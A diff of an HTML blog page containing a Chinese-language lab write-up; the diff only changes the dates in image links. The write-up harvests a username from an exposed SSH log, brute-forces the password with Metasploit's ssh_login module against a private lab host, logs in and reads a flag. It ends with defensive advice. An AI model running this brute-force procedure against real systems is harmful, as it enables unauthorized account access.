@@ -76,36 +76,36 @@
 <h4 id="实验内容"><a href="#实验内容" class="headerlink" title="实验内容"></a>实验内容</h4><h5 id="实验原理"><a href="#实验原理" class="headerlink" title="实验原理"></a>实验原理</h5><ul>
 <li>利用ssh日志获取用户名，爆破用户密码,以此用户登录</li>
 </ul>
-<h4 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h4><h5 id="步骤1：打开目标网站（192-168-38-130-22）"><a href="#步骤1：打开目标网站（192-168-38-130-22）" class="headerlink" title="步骤1：打开目标网站（192.168.38.130:22）"></a>步骤1：打开目标网站（192.168.38.130:22）</h5><p><img src="https://i.loli.net/2025/10/29/SswneztWBFy1fKR.jpg"></p>
-<h5 id="步骤2：通过御剑发现存在ssh登录日志，在浏览器上查看ssh登录日志发现成功登录用户的用户名（192-168-38-130-22-secure）"><a href="#步骤2：通过御剑发现存在ssh登录日志，在浏览器上查看ssh登录日志发现成功登录用户的用户名（192-168-38-130-22-secure）" class="headerlink" title="步骤2：通过御剑发现存在ssh登录日志，在浏览器上查看ssh登录日志发现成功登录用户的用户名（192.168.38.130:22/secure）"></a>步骤2：通过御剑发现存在ssh登录日志，在浏览器上查看ssh登录日志发现成功登录用户的用户名（192.168.38.130:22/secure）</h5><p><img src="https://i.loli.net/2025/10/29/TiG2ed5q6tWzbkE.png"></p>
-<p><img src="https://i.loli.net/2025/10/29/Si7bdKTCEBj3RAL.jpg"></p>
+<h4 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h4><h5 id="步骤1：打开目标网站（192-168-38-130-22）"><a href="#步骤1：打开目标网站（192-168-38-130-22）" class="headerlink" title="步骤1：打开目标网站（192.168.38.130:22）"></a>步骤1：打开目标网站（192.168.38.130:22）</h5><p><img src="https://i.loli.net/2021/10/29/SswneztWBFy1fKR.jpg"></p>
+<h5 id="步骤2：通过御剑发现存在ssh登录日志，在浏览器上查看ssh登录日志发现成功登录用户的用户名（192-168-38-130-22-secure）"><a href="#步骤2：通过御剑发现存在ssh登录日志，在浏览器上查看ssh登录日志发现成功登录用户的用户名（192-168-38-130-22-secure）" class="headerlink" title="步骤2：通过御剑发现存在ssh登录日志，在浏览器上查看ssh登录日志发现成功登录用户的用户名（192.168.38.130:22/secure）"></a>步骤2：通过御剑发现存在ssh登录日志，在浏览器上查看ssh登录日志发现成功登录用户的用户名（192.168.38.130:22/secure）</h5><p><img src="https://i.loli.net/2021/10/29/TiG2ed5q6tWzbkE.png"></p>
+<p><img src="https://i.loli.net/2021/10/29/Si7bdKTCEBj3RAL.jpg"></p>
 <h5 id="步骤3：打开msf工具准备爆破用户密码"><a href="#步骤3：打开msf工具准备爆破用户密码" class="headerlink" title="步骤3：打开msf工具准备爆破用户密码"></a>步骤3：打开msf工具准备爆破用户密码</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://i.loli.net/2025/10/29/JKSjeg8nHlMauiW.jpg"></p>
+<p><img src="https://i.loli.net/2021/10/29/JKSjeg8nHlMauiW.jpg"></p>
 <h5 id="步骤4：搜索msf里ssh-login的相关工具和攻击载荷。"><a href="#步骤4：搜索msf里ssh-login的相关工具和攻击载荷。" class="headerlink" title="步骤4：搜索msf里ssh_login的相关工具和攻击载荷。"></a>步骤4：搜索msf里ssh_login的相关工具和攻击载荷。</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search ssh_login</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://i.loli.net/2025/10/29/4ScP3d8tQ1G7KvA.jpg"></p>
+<p><img src="https://i.loli.net/2021/10/29/4ScP3d8tQ1G7KvA.jpg"></p>
 <h5 id="步骤5：打开msf里的ssh工具"><a href="#步骤5：打开msf里的ssh工具" class="headerlink" title="步骤5：打开msf里的ssh工具"></a>步骤5：打开msf里的ssh工具</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/ssh/ssh_login</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://i.loli.net/2025/10/29/B7FgmtY8Za3A5i6.jpg"></p>
+<p><img src="https://i.loli.net/2021/10/29/B7FgmtY8Za3A5i6.jpg"></p>
 <h5 id="步骤6：查看需要设置的相关项，“yes”表示必须填写的参数"><a href="#步骤6：查看需要设置的相关项，“yes”表示必须填写的参数" class="headerlink" title="步骤6：查看需要设置的相关项，“yes”表示必须填写的参数"></a>步骤6：查看需要设置的相关项，“yes”表示必须填写的参数</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://i.loli.net/2025/10/29/x58Qgovp2F9wLKS.png"></p>
+<p><img src="https://i.loli.net/2021/10/29/x58Qgovp2F9wLKS.png"></p>
 <h5 id="步骤7：修改相关参数"><a href="#步骤7：修改相关参数" class="headerlink" title="步骤7：修改相关参数"></a>步骤7：修改相关参数</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">set VERBOSE true  //显示攻击日志</span><br><span class="line">set PASS_FILE D:/library.txt  //载入密码字典</span><br><span class="line">set THREADS 10  //设置线程</span><br><span class="line">set RHOSTS 192.168.38.130  //设置目标主机ip</span><br><span class="line">set USERNAME icq  //设置登录用户名icq</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://i.loli.net/2025/10/29/U2MRNGjhe8Sq9Vy.jpg"></p>
+<p><img src="https://i.loli.net/2021/10/29/U2MRNGjhe8Sq9Vy.jpg"></p>
 <h5 id="步骤8：在终端中输入“run”-开始向目标主机爆破ssh的登陆帐号和密码，登陆帐号为icq-密码为p-ssword。"><a href="#步骤8：在终端中输入“run”-开始向目标主机爆破ssh的登陆帐号和密码，登陆帐号为icq-密码为p-ssword。" class="headerlink" title="步骤8：在终端中输入“run”, 开始向目标主机爆破ssh的登陆帐号和密码，登陆帐号为icq,密码为p@ssword。"></a>步骤8：在终端中输入“run”, 开始向目标主机爆破ssh的登陆帐号和密码，登陆帐号为icq,密码为p@ssword。</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://i.loli.net/2025/10/29/1bWE4TmkHYuMU9X.jpg"></p>
+<p><img src="https://i.loli.net/2021/10/29/1bWE4TmkHYuMU9X.jpg"></p>
 <h5 id="步骤9：在win10的cmd管理员界面用ssh通过账户“icq”密码“p-ssword”远程登录目标主机"><a href="#步骤9：在win10的cmd管理员界面用ssh通过账户“icq”密码“p-ssword”远程登录目标主机" class="headerlink" title="步骤9：在win10的cmd管理员界面用ssh通过账户“icq”密码“p@ssword”远程登录目标主机"></a>步骤9：在win10的cmd管理员界面用ssh通过账户“icq”密码“p@ssword”远程登录目标主机</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh icq@192.168.38.130</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://i.loli.net/2025/10/29/3XJC5qEemcPN2bW.jpg"></p>
+<p><img src="https://i.loli.net/2021/10/29/3XJC5qEemcPN2bW.jpg"></p>
 <h5 id="步骤10：使用命令查看用户父目录，发现flag文件夹"><a href="#步骤10：使用命令查看用户父目录，发现flag文件夹" class="headerlink" title="步骤10：使用命令查看用户父目录，发现flag文件夹"></a>步骤10：使用命令查看用户父目录，发现flag文件夹</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -a</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://i.loli.net/2025/10/29/5HIbmduAj7nPVWO.jpg"></p>
+<p><img src="https://i.loli.net/2021/10/29/5HIbmduAj7nPVWO.jpg"></p>
 <h5 id="步骤11：使用cat命令查看flag"><a href="#步骤11：使用cat命令查看flag" class="headerlink" title="步骤11：使用cat命令查看flag"></a>步骤11：使用cat命令查看flag</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat flag.txt</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://i.loli.net/2025/10/29/x58Qgovp2F9wLKS.png"></p>
+<p><img src="https://i.loli.net/2021/10/29/x58Qgovp2F9wLKS.png"></p>
 <h4 id="实验结果分析与总结"><a href="#实验结果分析与总结" class="headerlink" title="实验结果分析与总结"></a>实验结果分析与总结</h4><p>在本次实验中，利用ssh登录日志分析出成功登录用户的用户名，再利用msf工具中的ssh暴力破解板块对用户密码进行破解，最后通过ssh远程登陆目标主机，在父目录下找到flag。</p>
 <h4 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h4><p>当我们注册密码时，应该使用强密码。</p>
 <p>应该将ssh登录日志查看权限提高到管理员权限。</p>
